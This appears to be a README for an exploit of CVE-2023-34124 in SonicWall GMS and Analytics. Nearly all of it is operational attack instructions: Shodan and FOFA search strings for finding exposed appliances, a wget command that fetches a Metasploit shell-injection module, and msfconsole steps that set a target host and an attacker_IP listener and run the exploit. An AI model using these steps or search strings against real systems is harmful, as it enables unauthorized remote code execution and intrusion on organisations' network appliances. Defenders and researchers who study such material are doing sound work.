# CVE-2023-34124

![](https://img.shields.io/static/v1?label=Product&message=Sonicwall&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=GMS:%209.3.2-SP1%20and%20earlier;%20Analytics:%202.5.0.4-R7%20and%20earlier&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Authentication%20Bypass&color=red)

- Shodan dork:
```
http.favicon.hash:631108382
```
```
http.html:"/sgms/css/martini.css"
```
- FOFA dork:
```
body="/sgms/css/martini.css"
```
### Install
```
wget https://raw.githubusercontent.com/getdrive/PoC/main/2023/Sonicwall_Shell_Injection/sonicwall_shell_injection_cve_2023_34124.rb
```
```
cp sonicwall_shell_injection_cve_2023_34124.rb /usr/share/metasploit-framework/modules/exploits/multi/http/
```
### Metasploit-framework usage
```
msfdb reinit; msfconsole -q
```
```
use exploits/multi/http/sonicwall_shell_injection_cve_2023_34124
```
```
set rhosts target_IP
```
```
set lhost attacker_IP
```
```
run
```
